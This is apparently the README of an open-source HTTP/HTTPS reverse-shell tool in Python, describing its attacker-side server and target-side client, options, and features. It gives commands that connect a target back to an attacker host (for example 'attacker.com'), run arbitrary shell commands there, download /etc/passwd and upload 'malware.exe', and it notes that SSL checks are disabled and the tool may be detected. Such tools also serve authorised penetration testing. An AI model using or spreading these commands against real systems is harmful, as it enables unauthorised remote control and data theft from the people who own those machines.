# HTTP(S) Reverse Shell

![https://img.shields.io/github/stars/apurvsinghgautam/HTTP-Reverse-Shell](https://img.shields.io/github/stars/apurvsinghgautam/HTTP-Reverse-Shell) ![https://img.shields.io/github/forks/apurvsinghgautam/HTTP-Reverse-Shell](https://img.shields.io/github/forks/apurvsinghgautam/HTTP-Reverse-Shell)

A reverse shell over HTTP/HTTPS with streaming command output, file transfer capabilities, and interrupt handling. Built with Python 3 with no external dependencies (except `legacy-cgi` for Python 3.13+, but it's server dependency so no worries).

## Features

- ✅ **HTTP/HTTPS Support** - Automatic protocol selection based on port (443 = HTTPS, others = HTTP)
- ✅ **Streaming Command Output** - Real-time output streaming line-by-line
- ✅ **File Transfer** - Bidirectional file transfer with base64 encoding
  - `download <path>` - Download file from target
  - `upload <path>` - Upload file to target
- ✅ **Command Interrupt** - Press Ctrl-C during command execution to stop it
- ✅ **Colorized Output** - Easy-to-read colored server output
- ✅ **Connection Status** - Shows client IP and port on connection
- ✅ **Safe Termination** - Confirmation prompts for terminating client
- ✅ **Configurable** - Command-line arguments for all settings


## Known Bugs

- Client-side the process is not killed properly
- Ctr-C stopping execution on server-side wont work if you're redirecting output somewhere (e.g to files). This is because the streaming feature reads line by line from subprocess output. This should hopefully be fixed in the future

## Unknown Bugs

- Unknown

## Prerequisites

- Python 3.x on both attacker and target machines
- For Python 3.13+: `pip install legacy-cgi`

## Usage

### Server (Attacker Machine)

Run the server with optional arguments:

```bash
python server.py [options]
```

**Options:**

- `-H, --host` - Server IP to bind to (default: 0.0.0.0)
- `-p, --port` - Server port (default: 8080)
- `-s, --shell-prefix` - Custom shell prompt prefix (default: Shell)
- `-h, --help` - Show help message

**Examples:**

```bash
python server.py                                    # Start on 0.0.0.0:8080
python server.py -p 443                             # HTTPS on port 443
python server.py -p 13371 -s "Target1"              # Custom port and prefix
```

### Client (Target Machine)

Run the client with optional arguments:

```bash
python client.py [options]
```

**Options:**

- `-H, --host` - Attacker IP address or domain (default: 127.0.0.1)
- `-p, --port` - Attacker port (default: 443)
- `-d, --debug` - Enable debug output
- `-h, --help` - Show help message

**Examples:**

```bash
python client.py -H attacker.com -p 443             # Connect to attacker.com:443 (HTTPS)
python client.py -H 10.0.0.5 -p 8080                # Connect to 10.0.0.5:8080 (HTTP)
python client.py -H example.com -p 443 --debug      # With debug output
```

## Commands

Once connected, you can use these special commands:

- `download <file_path>` - Download file from target to current directory
- `upload <file_path>` - Upload file from attacker to target's current directory
- `terminate` - Terminate the client connection (requires confirmation)
- **Ctrl-C during command** - Interrupt running command and return to prompt
- **Ctrl-C at prompt (twice)** - Shut down server
- Any other command - Execute as shell command on target

**Examples:**

```bash
Shell> ls -la                                       # Execute command
Shell> download /etc/passwd                         # Download file from target
Shell> upload malware.exe                           # Upload file to target
Shell> terminate                                    # Terminate client (with Y/N prompt)
```

## Features in Detail

### File Transfer

- **Download**: Files are saved locally with original filename, with duplicate handling

  - If file exists, prompts to overwrite (Y/N)
  - If declined, generates timestamped filename (e.g., `file_20241230143022.txt`)
- **Upload**: Files are transferred via base64 encoding and saved to target's current directory

### Interrupt Handling

- Press **Ctrl-C** during command execution to stop the running command
- Both client and server return to ready state
- Command process is forcefully killed on target machine
- Press **Ctrl-C twice** at server prompt to shut down server

### Protocol Selection

- Port **443** → Automatic HTTPS
- Port **80** or others → HTTP
- SSL verification is disabled for flexibility

### Output

Server displays colorized messages:

- 🟢 **Green** - Success messages (connection, file saved)
- 🔴 **Red** - Errors (failures, disconnections)
- 🔵 **Cyan** - Info messages (listening, file operations)
- 🟡 **Yellow** - Warnings (prompts, shutdown)
- 🟣 **Magenta** - Shell prompt

## Security Notes

⚠️ **For educational and authorized testing only!**

- SSL certificate verification is disabled
- No authentication mechanism
- No encryption for HTTP mode
- Use HTTPS (port 443) for encrypted communication
- Be aware that this tool can be detected by security systems

## Troubleshooting

**Connection issues:**

- Verify firewall rules allow the port
- Check that attacker IP/domain is correct
- Ensure both machines can reach each other

**Python 3.13+ cgi deprecation:**

- Install legacy-cgi: `pip install legacy-cgi`

**Process won't terminate:**

- Client uses `proc.kill()` for forceful termination
- Check if process has child processes that need cleanup

## License

MIT License - See original repository for details
